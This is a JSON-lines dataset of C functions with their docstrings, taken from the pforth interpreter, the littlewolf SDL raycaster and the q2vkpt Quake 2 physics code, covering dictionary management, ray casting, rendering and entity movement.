{"docstring": "/**************************************************************************\n** Main entry point for pForth.\n*/\n", "func_signal": "ThrowCode pfDoForth( const char *DicFileName, const char *SourceName, cell_t IfInit )", "code": "{\n    pfTaskData_t *cftd;\n    pfDictionary_t *dic = NULL;\n    ThrowCode Result = 0;\n    ExecToken  EntryPoint = 0;\n\n#ifdef PF_USER_INIT\n    Result = PF_USER_INIT;\n    if( Result < 0 ) goto error1;\n#endif\n\n    pfInit();\n\n/* Allocate Task structure. */\n    pfDebugMessage(\"pfDoForth: call pfCreateTask()\\n\");\n    cftd = pfCreateTask( DEFAULT_USER_DEPTH, DEFAULT_RETURN_DEPTH );\n\n    if( cftd )\n    {\n        pfSetCurrentTask( cftd );\n\n        if( !gVarQuiet )\n        {\n            MSG( \"PForth V\"PFORTH_VERSION );\n            if( IsHostLittleEndian() ) MSG(\"-LE\");\n            else MSG(\"-BE\");\n#if PF_BIG_ENDIAN_DIC\n            MSG(\"/BE\");\n#elif PF_LITTLE_ENDIAN_DIC\n            MSG(\"/LE\");\n#endif\n            if (sizeof(cell_t) == 8)\n            {\n                MSG(\"/64\");\n            }\n            else if (sizeof(cell_t) == 4)\n            {\n                MSG(\"/32\");\n            }\n\n            MSG( \", built \"__DATE__\" \"__TIME__ );\n        }\n\n/* Don't use MSG before task set. */\n        if( SourceName )\n        {\n            pfDebugMessage(\"SourceName = \"); pfDebugMessage(SourceName); pfDebugMessage(\"\\n\");\n        }\n\n\n#ifdef PF_NO_GLOBAL_INIT\n        if( LoadCustomFunctionTable() < 0 ) goto error2; /* Init custom 'C' call array. */\n#endif\n\n#if (!defined(PF_NO_INIT)) && (!defined(PF_NO_SHELL))\n        if( IfInit )\n        {\n            pfDebugMessage(\"Build dictionary from scratch.\\n\");\n            dic = pfBuildDictionary( PF_DEFAULT_HEADER_SIZE, PF_DEFAULT_CODE_SIZE );\n        }\n        else\n#else\n        TOUCH(IfInit);\n#endif /* !PF_NO_INIT && !PF_NO_SHELL*/\n        {\n            if( DicFileName )\n            {\n                pfDebugMessage(\"DicFileName = \"); pfDebugMessage(DicFileName); pfDebugMessage(\"\\n\");\n                if( !gVarQuiet )\n                {\n                    EMIT_CR;\n                }\n                dic = pfLoadDictionary( DicFileName, &EntryPoint );\n            }\n            else\n            {\n                if( !gVarQuiet )\n                {\n                    MSG(\" (static)\");\n                    EMIT_CR;\n                }\n                dic = pfLoadStaticDictionary();\n            }\n        }\n        if( dic == NULL ) goto error2;\n\n        if( !gVarQuiet )\n        {\n            EMIT_CR;\n        }\n\n        pfDebugMessage(\"pfDoForth: try AUTO.INIT\\n\");\n        Result = pfExecIfDefined(\"AUTO.INIT\");\n        if( Result != 0 )\n        {\n            MSG(\"Error in AUTO.INIT\");\n            goto error2;\n        }\n\n        if( EntryPoint != 0 )\n        {\n            Result = pfCatch( EntryPoint );\n        }\n#ifndef PF_NO_SHELL\n        else\n        {\n            if( SourceName == NULL )\n            {\n                pfDebugMessage(\"pfDoForth: pfQuit\\n\");\n                Result = pfQuit();\n            }\n            else\n            {\n                if( !gVarQuiet )\n                {\n                    MSG(\"Including: \");\n                    MSG(SourceName);\n                    MSG(\"\\n\");\n                }\n                Result = pfIncludeFile( SourceName );\n            }\n        }\n#endif /* PF_NO_SHELL */\n\n    /* Clean up after running Forth. */\n        pfExecIfDefined(\"AUTO.TERM\");\n        pfDeleteDictionary( dic );\n        pfDeleteTask( cftd );\n    }\n\n    pfTerm();\n\n#ifdef PF_USER_TERM\n    PF_USER_TERM;\n#endif\n\n    return Result;\n\nerror2:\n    MSG(\"pfDoForth: Error occured.\\n\");\n    pfDeleteTask( cftd );\n    /* Terminate so we restore normal shell tty mode. */\n    pfTerm();\n\n#ifdef PF_USER_INIT\nerror1:\n#endif\n\n    return -1;\n}", "path": "pforth/csrc/pf_core.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
{"docstring": "/***************************************************************\n** Create a complete dictionary.\n** The dictionary consists of two parts, the header with the names,\n** and the code portion.\n** Delete using pfDeleteDictionary().\n** Return pointer to dictionary management structure.\n*/\n", "func_signal": "PForthDictionary pfCreateDictionary( cell_t HeaderSize, cell_t CodeSize )", "code": "{\n/* Allocate memory for initial dictionary. */\n    pfDictionary_t *dic;\n\n    dic = ( pfDictionary_t * ) pfAllocMem( sizeof( pfDictionary_t ) );\n    if( !dic ) goto nomem;\n    pfSetMemory( dic, 0, sizeof( pfDictionary_t ));\n\n    dic->dic_Flags |= PF_DICF_ALLOCATED_SEGMENTS;\n\n/* Align dictionary segments to preserve alignment of floats across hosts.\n * Thank you Helmut Proelss for pointing out that this needs to be cast\n * to (ucell_t) on 16 bit systems.\n */\n#define DIC_ALIGNMENT_SIZE  ((ucell_t)(0x10))\n#define DIC_ALIGN(addr)  ((((ucell_t)(addr)) + DIC_ALIGNMENT_SIZE - 1) & ~(DIC_ALIGNMENT_SIZE - 1))\n\n/* Allocate memory for header. */\n    if( HeaderSize > 0 )\n    {\n        dic->dic_HeaderBaseUnaligned = (ucell_t) pfAllocMem( (ucell_t) HeaderSize + DIC_ALIGNMENT_SIZE );\n        if( !dic->dic_HeaderBaseUnaligned ) goto nomem;\n/* Align header base. */\n        dic->dic_HeaderBase = DIC_ALIGN(dic->dic_HeaderBaseUnaligned);\n        pfSetMemory( (char *) dic->dic_HeaderBase, 0xA5, (ucell_t) HeaderSize);\n        dic->dic_HeaderLimit = dic->dic_HeaderBase + HeaderSize;\n        dic->dic_HeaderPtr = dic->dic_HeaderBase;\n    }\n    else\n    {\n        dic->dic_HeaderBase = 0;\n    }\n\n/* Allocate memory for code. */\n    dic->dic_CodeBaseUnaligned = (ucell_t) pfAllocMem( (ucell_t) CodeSize + DIC_ALIGNMENT_SIZE );\n    if( !dic->dic_CodeBaseUnaligned ) goto nomem;\n    dic->dic_CodeBase = DIC_ALIGN(dic->dic_CodeBaseUnaligned);\n    pfSetMemory( (char *) dic->dic_CodeBase, 0x5A, (ucell_t) CodeSize);\n\n    dic->dic_CodeLimit = dic->dic_CodeBase + CodeSize;\n    dic->dic_CodePtr.Byte = ((uint8_t *) (dic->dic_CodeBase + QUADUP(NUM_PRIMITIVES)));\n\n    return (PForthDictionary) dic;\nnomem:\n    pfDeleteDictionary( dic );\n    return NULL;\n}", "path": "pforth/csrc/pf_core.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
{"docstring": "/* Print name, mask off any dictionary bits. */\n", "func_signal": "void TypeName( const char *Name )", "code": "{\n    const char *FirstChar;\n    cell_t Len;\n\n    FirstChar = Name+1;\n    Len = *Name & 0x1F;\n\n    ioType( FirstChar, Len );\n}", "path": "pforth/csrc/pf_text.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
{"docstring": "/***************************************************************\n** Top level interpreter.\n***************************************************************/\n", "func_signal": "ThrowCode pfQuit( void )", "code": "{\n    ThrowCode exception;\n    int go = 1;\n\n    while(go)\n    {\n        exception = ffOuterInterpreterLoop();\n        if( exception == 0 )\n        {\n            exception = ffOK();\n        }\n\n        switch( exception )\n        {\n        case 0:\n            break;\n\n        case THROW_BYE:\n            go = 0;\n            break;\n\n        case THROW_ABORT:\n        default:\n            ffDotS();\n            pfReportThrow( exception );\n            pfHandleIncludeError();\n            pfResetForthTask();\n            break;\n        }\n    }\n\n    return gVarReturnCode;\n}", "path": "pforth/csrc/pf_core.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
{"docstring": "/***************************************************************\n** Output 'C' string message.\n** Use sdTerminalOut which works before initializing gCurrentTask.\n***************************************************************/\n", "func_signal": "void pfDebugMessage( const char *CString )", "code": "{\n#if 0\n    while( *CString )\n    {\n        char c = *CString++;\n        if( c == '\\n' )\n        {\n            sdTerminalOut( 0x0D );\n            sdTerminalOut( 0x0A );\n            pfDebugMessage( \"DBG: \" );\n        }\n        else\n        {\n            sdTerminalOut( c );\n        }\n    }\n#else\n    (void)CString;\n#endif\n}", "path": "pforth/csrc/pf_core.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
{"docstring": "/***************************************************************\n** Delete a dictionary created by pfCreateDictionary()\n*/\n", "func_signal": "void pfDeleteDictionary( PForthDictionary dictionary )", "code": "{\n    pfDictionary_t *dic = (pfDictionary_t *) dictionary;\n    if( !dic ) return;\n\n    if( dic->dic_Flags & PF_DICF_ALLOCATED_SEGMENTS )\n    {\n        FREE_VAR( dic->dic_HeaderBaseUnaligned );\n        FREE_VAR( dic->dic_CodeBaseUnaligned );\n    }\n    pfFreeMem( dic );\n}", "path": "pforth/csrc/pf_core.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
{"docstring": "/**************************************************************\n** Copy a NUL terminated string to a Forth counted string.\n*/\n", "func_signal": "char *CStringToForth( char *dst, const char *CString, cell_t dstSize )", "code": "{\n    cell_t i;\n\n    /* Make sure the SIZE+text can fit. */\n    for( i=1; i<dstSize; i++ )\n    {\n        if( *CString == 0 )\n        {\n            break;\n        }\n        dst[i] = *CString++;\n    }\n    *dst = (char ) i-1;\n    return dst;\n}", "path": "pforth/csrc/pf_text.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
{"docstring": "/***************************************************************\n** Used by Quit and other routines to restore system.\n***************************************************************/\n", "func_signal": "static void pfResetForthTask( void )", "code": "{\n/* Go back to terminal input. */\n    gCurrentTask->td_InputStream = PF_STDIN;\n\n/* Reset stacks. */\n    gCurrentTask->td_StackPtr = gCurrentTask->td_StackBase;\n    gCurrentTask->td_ReturnPtr = gCurrentTask->td_ReturnBase;\n#ifdef PF_SUPPORT_FP  /* Reset Floating Point stack too! */\n    gCurrentTask->td_FloatStackPtr = gCurrentTask->td_FloatStackBase;\n#endif\n\n/* Advance >IN to end of input. */\n    gCurrentTask->td_IN = gCurrentTask->td_SourceNum;\n    gVarState = 0;\n}", "path": "pforth/csrc/pf_core.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
{"docstring": "/**************************************************************\n** Compare two test strings, case INsensitive.\n** Return TRUE if they match.\n*/\n", "func_signal": "cell_t ffCompareTextCaseN( const char *s1, const char *s2, cell_t len )", "code": "{\n    cell_t i, Result;\n    char  c1,c2;\n\n    Result = TRUE;\n    for( i=0; i<len; i++ )\n    {\n        c1 = pfCharToLower(*s1++);\n        c2 = pfCharToLower(*s2++);\nDBUGX((\"ffCompareText: c1 = 0x%x, c2 = 0x%x\\n\", c1, c2 ));\n        if( c1 != c2 )\n        {\n            Result = FALSE;\n            break;\n        }\n    }\nDBUGX((\"ffCompareText: return 0x%x\\n\", Result ));\n    return Result;\n}", "path": "pforth/csrc/pf_text.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
{"docstring": "/**************************************************************\n** Compare two strings, case sensitive.\n** Return zero if they match, -1 if s1<s2, +1 is s1>s2;\n*/\n", "func_signal": "cell_t ffCompare( const char *s1, cell_t len1, const char *s2, cell_t len2 )", "code": "{\n    cell_t i, result, n, diff;\n\n    result = 0;\n    n = MIN(len1,len2);\n    for( i=0; i<n; i++ )\n    {\n        if( (diff = (*s2++ - *s1++)) != 0 )\n        {\n            result = (diff > 0) ? -1 : 1 ;\n            break;\n        }\n    }\n    if( result == 0 )  /* Match up to MIN(len1,len2) */\n    {\n        if( len1 < len2 )\n        {\n            result = -1;\n        }\n        else if ( len1 > len2 )\n        {\n            result = 1;\n        }\n    }\n    return result;\n}", "path": "pforth/csrc/pf_text.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
{"docstring": "/***************************************************************\n** Include file based on 'C' name.\n***************************************************************/\n", "func_signal": "cell_t pfIncludeFile( const char *FileName )", "code": "{\n    FileStream *fid;\n    cell_t Result;\n    char  buffer[32];\n    cell_t numChars, len;\n\n/* Open file. */\n    fid = sdOpenFile( FileName, \"r\" );\n    if( fid == NULL )\n    {\n        ERR(\"pfIncludeFile could not open \");\n        ERR(FileName);\n        EMIT_CR;\n        return -1;\n    }\n\n/* Create a dictionary word named ::::FileName for FILE? */\n    pfCopyMemory( &buffer[0], \"::::\", 4);\n    len = (cell_t) pfCStringLength(FileName);\n    numChars = ( len > (32-4-1) ) ? (32-4-1) : len;\n    pfCopyMemory( &buffer[4], &FileName[len-numChars], numChars+1 );\n    CreateDicEntryC( ID_NOOP, buffer, 0 );\n\n    Result = ffIncludeFile( fid ); /* Also close the file. */\n\n/* Create a dictionary word named ;;;; for FILE? */\n    CreateDicEntryC( ID_NOOP, \";;;;\", 0 );\n\n    return Result;\n}", "path": "pforth/csrc/pf_core.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
{"docstring": "/* Initialize globals in a function to simplify loading on\n * embedded systems which may not support initialization of data section.\n */\n", "func_signal": "static void pfInit( void )", "code": "{\n/* all zero */\n    gCurrentTask = NULL;\n    gCurrentDictionary = NULL;\n    gNumPrimitives = 0;\n    gLocalCompiler_XT = 0;\n    gVarContext = (cell_t)NULL;   /* Points to last name field. */\n    gVarState = 0;        /* 1 if compiling. */\n    gVarEcho = 0;       /* Echo input. */\n    gVarTraceLevel = 0;   /* Trace Level for Inner Interpreter. */\n    gVarTraceFlags = 0;   /* Enable various internal debug messages. */\n    gVarReturnCode = 0;   /* Returned to caller of Forth, eg. UNIX shell. */\n    gIncludeIndex = 0;\n\n/* non-zero */\n    gVarBase = 10;        /* Numeric Base. */\n    gDepthAtColon = DEPTH_AT_COLON_INVALID;\n    gVarTraceStack = 1;\n\n    pfInitMemoryAllocator();\n    ioInit();\n}", "path": "pforth/csrc/pf_core.c", "commit_date": "2020-07-02 00:00:00", "repo_name": "philburk/pforth", "stars": 563, "license": "0bsd", "language": "c", "size": 707}
{"docstring": "// Calculates wall size using the <corrected> ray to the wall.\n", "func_signal": "static Wall project(const int xres, const int yres, const float focal, const Point corrected)", "code": "{\n    // Normal distance of corrected ray is clamped to some small value else wall size will shoot to infinity.\n    const float normal = corrected.x < 1e-2f ? 1e-2f : corrected.x;\n    const float size = 0.5f * focal * xres / normal;\n    const int top = (yres + size) / 2.0f;\n    const int bot = (yres - size) / 2.0f;\n    // Top and bottom values are clamped to screen size else renderer will waste cycles\n    // (or segfault) when rasterizing pixels off screen.\n    const Wall wall = { top > yres ? yres : top, bot < 0 ? 0 : bot, size };\n    return wall;\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "// Rotates the player by some radian value.\n", "func_signal": "static Point turn(const Point a, const float t)", "code": "{\n    const Point b = { a.x * cosf(t) - a.y * sinf(t), a.x * sinf(t) + a.y * cosf(t) };\n    return b;\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "// Returns a color value (RGB) from a decimal tile value.\n", "func_signal": "static uint32_t color(const int tile)", "code": "{\n    switch(tile)\n    {\n    default:\n    case 1: return 0x00AA0000; // Red.\n    case 2: return 0x0000AA00; // Green.\n    case 3: return 0x000000AA; // Blue.\n    }\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "// Locks the gpu, returning a pointer to video memory.\n", "func_signal": "static Display lock(const Gpu gpu)", "code": "{\n    void* screen;\n    int pitch;\n    SDL_LockTexture(gpu.texture, NULL, &screen, &pitch);\n    const Display display = { (uint32_t*) screen, pitch / (int) sizeof(uint32_t) };\n    return display;\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "// Steps horizontally along a square grid.\n", "func_signal": "static Point sh(const Point a, const Point b)", "code": "{\n    const float x = b.x > 0.0f ? fl(a.x + 1.0f) : cl(a.x - 1.0f);\n    const float y = slope(b) * (x - a.x) + a.y;\n    const Point c = { x, y };\n    return c;\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "// Rotates a line by some radian amount.\n", "func_signal": "static Line rotate(const Line l, const float t)", "code": "{\n    const Line line = { turn(l.a, t), turn(l.b, t) };\n    return line;\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "// Get Psyched!\n", "func_signal": "int main(int argc, char* argv[])", "code": "{\n    (void) argc;\n    (void) argv;\n    const Gpu gpu = setup(700, 400, true);\n    const Map map = build();\n    Hero hero = born(0.8f);\n    while(!done())\n    {\n        const uint8_t* key = SDL_GetKeyboardState(NULL);\n        hero = spin(hero, key);\n        hero = move(hero, map.walling, key);\n        render(hero, map, gpu);\n    }\n    // No need to free anything - gives quick exit.\n    return 0;\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "// Rotates a point 90 degrees.\n", "func_signal": "static Point rag(const Point a)", "code": "{\n    const Point b = { -a.y, a.x };\n    return b;\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "// Returns a decimal value of the ascii tile value on the map.\n", "func_signal": "static int tile(const Point a, const char** const tiles)", "code": "{\n    const int x = a.x;\n    const int y = a.y;\n    return tiles[y][x] - '0';\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "// Renders the entire scene from the <hero> perspective given a <map> and a software <gpu>.\n", "func_signal": "static void render(const Hero hero, const Map map, const Gpu gpu)", "code": "{\n    const int t0 = SDL_GetTicks();\n    const Line camera = rotate(hero.fov, hero.theta);\n    const Display display = lock(gpu);\n    // Ray cast for all columns of the window.\n    for(int x = 0; x < gpu.xres; x++)\n    {\n        const Point direction = lerp(camera, x / (float) gpu.xres);\n        const Hit hit = cast(hero.where, direction, map.walling);\n        const Point ray = sub(hit.where, hero.where);\n        const Line trace = { hero.where, hit.where };\n        const Point corrected = turn(ray, -hero.theta);\n        const Wall wall = project(gpu.xres, gpu.yres, hero.fov.a.x, corrected);\n        // Renders flooring.\n        for(int y = 0; y < wall.bot; y++)\n            put(display, x, y, color(tile(lerp(trace, -pcast(wall.size, gpu.yres, y)), map.floring)));\n        // Renders wall.\n        for(int y = wall.bot; y < wall.top; y++)\n            put(display, x, y, color(hit.tile));\n        // Renders ceiling.\n        for(int y = wall.top; y < gpu.yres; y++)\n            put(display, x, y, color(tile(lerp(trace, +pcast(wall.size, gpu.yres, y)), map.ceiling)));\n    }\n    unlock(gpu);\n    present(gpu);\n    // Caps frame rate to ~60 fps if the vertical sync (VSYNC) init failed.\n    const int t1 = SDL_GetTicks();\n    const int ms = 16 - (t1 - t0);\n    SDL_Delay(ms < 0 ? 0 : ms);\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "// Setups the software gpu.\n", "func_signal": "static Gpu setup(const int xres, const int yres, const bool vsync)", "code": "{\n    if (SDL_Init(SDL_INIT_VIDEO) != 0)\n    {\n        puts(SDL_GetError());\n        exit(1);\n    }\n    SDL_Window* const window = SDL_CreateWindow(\n        \"littlewolf\",\n        SDL_WINDOWPOS_UNDEFINED,\n        SDL_WINDOWPOS_UNDEFINED,\n        xres, yres,\n        SDL_WINDOW_SHOWN);\n    SDL_Renderer* const renderer = SDL_CreateRenderer(\n        window,\n        -1,\n        SDL_RENDERER_ACCELERATED | (vsync ? SDL_RENDERER_PRESENTVSYNC : 0x0));\n    // Notice the flip between xres and yres.\n    // The texture is 90 degrees flipped on its side for fast cache access.\n    SDL_Texture* const texture = SDL_CreateTexture(\n        renderer,\n        SDL_PIXELFORMAT_ARGB8888,\n        SDL_TEXTUREACCESS_STREAMING,\n        yres, xres);\n    if(window == NULL || renderer == NULL || texture == NULL)\n    {\n        puts(SDL_GetError());\n        exit(1);\n    }\n    const Gpu gpu = { window, renderer, texture, xres, yres };\n    return gpu;\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "// Changes the field of view. A focal value of 1.0 is 90 degrees.\n", "func_signal": "static Line viewport(const float focal)", "code": "{\n    const Line fov = {\n        { focal, -1.0f },\n        { focal, +1.0f },\n    };\n    return fov;\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "// Moves the hero when w,a,s,d are held down. Handles collision detection for the walls.\n", "func_signal": "static Hero move(Hero hero, const char** const walling, const uint8_t* key)", "code": "{\n    const Point last = hero.where, zero = { 0.0f, 0.0f };\n    // Accelerates with key held down.\n    if(key[SDL_SCANCODE_W] || key[SDL_SCANCODE_S] || key[SDL_SCANCODE_D] || key[SDL_SCANCODE_A])\n    {\n        const Point reference = { 1.0f, 0.0f };\n        const Point direction = turn(reference, hero.theta);\n        const Point acceleration = mul(direction, hero.acceleration);\n        if(key[SDL_SCANCODE_W]) hero.velocity = add(hero.velocity, acceleration);\n        if(key[SDL_SCANCODE_S]) hero.velocity = sub(hero.velocity, acceleration);\n        if(key[SDL_SCANCODE_D]) hero.velocity = add(hero.velocity, rag(acceleration));\n        if(key[SDL_SCANCODE_A]) hero.velocity = sub(hero.velocity, rag(acceleration));\n    }\n    // Otherwise, decelerates (exponential decay).\n    else hero.velocity = mul(hero.velocity, 1.0f - hero.acceleration / hero.speed);\n    // Caps velocity if top speed is exceeded.\n    if(mag(hero.velocity) > hero.speed) hero.velocity = mul(unit(hero.velocity), hero.speed);\n    // Moves.\n    hero.where = add(hero.where, hero.velocity);\n    // Sets velocity to zero if there is a collision and puts hero back in bounds.\n    if(tile(hero.where, walling))\n    {\n        hero.velocity = zero;\n        hero.where = last;\n    }\n    return hero;\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "// Builds the map. Note the static prefix for the parties. Map lives in .bss in private.\n", "func_signal": "static Map build()", "code": "{\n    static const char* ceiling[] = {\n        \"111111111111111111111111111111111111111111111\",\n        \"122223223232232111111111111111222232232322321\",\n        \"122222221111232111111111111111222222211112321\",\n        \"122221221232323232323232323232222212212323231\",\n        \"122222221111232111111111111111222222211112321\",\n        \"122223223232232111111111111111222232232322321\",\n        \"111111111111111111111111111111111111111111111\",\n    };\n    static const char* walling[] = {\n        \"111111111111111111111111111111111111111111111\",\n        \"100000000000000111111111111111000000000000001\",\n        \"103330001111000111111111111111033300011110001\",\n        \"103000000000000000000000000000030000030000001\",\n        \"103330001111000111111111111111033300011110001\",\n        \"100000000000000111111111111111000000000000001\",\n        \"111111111111111111111111111111111111111111111\",\n    };\n    static const char* floring[] = {\n        \"111111111111111111111111111111111111111111111\",\n        \"122223223232232111111111111111222232232322321\",\n        \"122222221111232111111111111111222222211112321\",\n        \"122222221232323323232323232323222222212323231\",\n        \"122222221111232111111111111111222222211112321\",\n        \"122223223232232111111111111111222232232322321\",\n        \"111111111111111111111111111111111111111111111\",\n    };\n    const Map map = { ceiling, walling, floring };\n    return map;\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "// Adds two points.\n", "func_signal": "static Point add(const Point a, const Point b)", "code": "{\n    const Point c = { a.x + b.x, a.y + b.y };\n    return c;\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "// Steps vertically along a square grid.\n", "func_signal": "static Point sv(const Point a, const Point b)", "code": "{\n    const float y = b.y > 0.0f ? fl(a.y + 1.0f) : cl(a.y - 1.0f);\n    const float x = (y - a.y) / slope(b) + a.x;\n    const Point c = { x, y };\n    return c;\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "// Subtracts two points.\n", "func_signal": "static Point sub(const Point a, const Point b)", "code": "{\n    const Point c = { a.x - b.x, a.y - b.y };\n    return c;\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "// Spins the hero when keys h,l are held down.\n", "func_signal": "static Hero spin(Hero hero, const uint8_t* key)", "code": "{\n    if(key[SDL_SCANCODE_H]) hero.theta -= 0.1f;\n    if(key[SDL_SCANCODE_L]) hero.theta += 0.1f;\n    return hero;\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "// Multiplies a point by a scalar value.\n", "func_signal": "static Point mul(const Point a, const float n)", "code": "{\n    const Point b = { a.x * n, a.y * n };\n    return b;\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "// Casts a ray from <where> in unit <direction> until a <walling> tile is hit.\n", "func_signal": "static Hit cast(const Point where, const Point direction, const char** const walling)", "code": "{\n    // Determine whether to step horizontally or vertically on the grid.\n    const Point hor = sh(where, direction);\n    const Point ver = sv(where, direction);\n    const Point ray = mag(sub(hor, where)) < mag(sub(ver, where)) ? hor : ver;\n    // Due to floating point error, the step may not make it to the next grid square.\n    // Three directions (dy, dx, dc) of a tiny step will be added to the ray\n    // depending on if the ray hit a horizontal wall, a vertical wall, or the corner\n    // of two walls, respectively.\n    const Point dc = mul(direction, 0.01f);\n    const Point dx = { dc.x, 0.0f };\n    const Point dy = { 0.0f, dc.y };\n    const Point test = add(ray,\n        // Tiny step for corner of two grid squares.\n        mag(sub(hor, ver)) < 1e-3f ? dc :\n        // Tiny step for vertical grid square.\n        dec(ray.x) == 0.0f ? dx :\n        // Tiny step for a horizontal grid square.\n        dy);\n    const Hit hit = { tile(test, walling), ray };\n    // If a wall was not hit, then continue advancing the ray.\n    return hit.tile ? hit : cast(ray, direction, walling);\n}", "path": "littlewolf/main.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "glouw/littlewolf", "stars": 791, "license": "mit", "language": "c", "size": 1624}
{"docstring": "/*\n=============\nSV_RunThink\n\nRuns thinking code for this frame if necessary\n=============\n*/\n", "func_signal": "qboolean SV_RunThink(edict_t *ent)", "code": "{\n    float   thinktime;\n\n    thinktime = ent->nextthink;\n    if (thinktime <= 0)\n        return qtrue;\n    if (thinktime > level.time + 0.001)\n        return qtrue;\n\n    ent->nextthink = 0;\n    if (!ent->think)\n        gi.error(\"NULL ent->think\");\n    ent->think(ent);\n\n    return qfalse;\n}", "path": "q2vkpt/src/baseq2/g_phys.c", "commit_date": "2012-07-25 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
{"docstring": "//============================================================================\n/*\n================\nG_RunEntity\n\n================\n*/\n", "func_signal": "void G_RunEntity(edict_t *ent)", "code": "{\n    if (ent->prethink)\n        ent->prethink(ent);\n\n    switch ((int)ent->movetype) {\n    case MOVETYPE_PUSH:\n    case MOVETYPE_STOP:\n        SV_Physics_Pusher(ent);\n        break;\n    case MOVETYPE_NONE:\n        SV_Physics_None(ent);\n        break;\n    case MOVETYPE_NOCLIP:\n        SV_Physics_Noclip(ent);\n        break;\n    case MOVETYPE_STEP:\n        SV_Physics_Step(ent);\n        break;\n    case MOVETYPE_TOSS:\n    case MOVETYPE_BOUNCE:\n    case MOVETYPE_FLY:\n    case MOVETYPE_FLYMISSILE:\n        SV_Physics_Toss(ent);\n        break;\n    default:\n        gi.error(\"SV_Physics: bad movetype %i\", (int)ent->movetype);\n    }\n}", "path": "q2vkpt/src/baseq2/g_phys.c", "commit_date": "2012-07-25 00:00:00", "repo_name": "cschied/q2vkpt", "stars": 948, "license": "gpl-2.0", "language": "c", "size": 129148}
